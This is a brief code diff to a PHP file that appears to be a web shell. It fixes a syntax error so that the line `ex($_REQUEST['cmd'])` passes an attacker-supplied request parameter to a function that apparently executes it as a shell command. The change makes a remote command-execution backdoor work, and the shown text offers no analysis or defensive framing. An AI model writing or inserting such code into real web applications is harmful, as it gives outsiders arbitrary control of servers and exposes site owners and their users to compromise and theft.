@@ -26,6 +26,6 @@ function ex($comd)
     return $res;
 }
 
-ex($_REQUEST['cmd'];
+ex($_REQUEST['cmd']);
 die("");
 ?>
